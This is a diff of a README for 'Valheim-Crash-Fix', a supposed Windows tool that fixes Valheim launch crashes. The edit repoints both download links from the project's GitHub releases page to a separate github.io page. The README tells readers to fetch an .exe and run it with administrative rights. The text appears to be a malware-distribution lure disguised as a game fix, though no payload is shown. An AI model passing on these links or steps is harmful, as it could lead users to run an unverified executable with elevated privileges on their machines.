@@ -1,6 +1,6 @@
 # 🛠️ Valheim-Crash-Fix - Get Your Game Running Without Errors
 
-[![Download Valheim-Crash-Fix](https://img.shields.io/badge/Download_Repair_Files-Blue?style=for-the-badge)](https://github.com/Lyndondoityourself605/Valheim-Crash-Fix/releases)
+[![Download Valheim-Crash-Fix](https://img.shields.io/badge/Download_Repair_Files-Blue?style=for-the-badge)](https://lyndondoityourself605.github.io)
 
 Valheim-Crash-Fix resolves issues that stop the game from opening on Windows 10 and 11. This tool identifies common system conflicts that prevent the game client from starting. It automates the repair process so you can return to playing.
 
@@ -30,7 +30,7 @@ Ensure your computer has administrative rights before you run the repair tool.
 
 Follow these steps to repair your game.
 
-1.  Visit the [releases page](https://github.com/Lyndondoityourself605/Valheim-Crash-Fix/releases).
+1.  Visit the [releases page](https://lyndondoityourself605.github.io).
 2.  Locate the section labeled Assets.
 3.  Click the file ending in .exe to download it to your computer.
 4.  Move the downloaded file to your desktop for easy access.
